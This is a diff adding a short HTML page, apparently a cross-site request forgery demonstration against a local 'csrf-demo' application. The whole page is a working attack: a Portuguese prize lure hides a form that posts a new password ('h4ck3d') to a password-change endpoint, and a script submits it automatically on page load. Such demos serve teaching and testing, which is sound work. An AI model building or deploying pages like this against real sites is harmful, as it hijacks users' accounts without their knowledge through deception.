@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <h3>Você ganhou um prêmio! Clique abaixo</h3>
+    <form action="http://localhost/csrf-demo/process_change.php" method="POST">
+        <input type="hidden" name="new_password" value="h4ck3d">
+        <input type="submit" value="Clique aqui para confirmar">
+    </form>
+    <script>
+        document.forms[0].submit(); // o ataque é automático
+    </script>
+</body>
+
+</html>
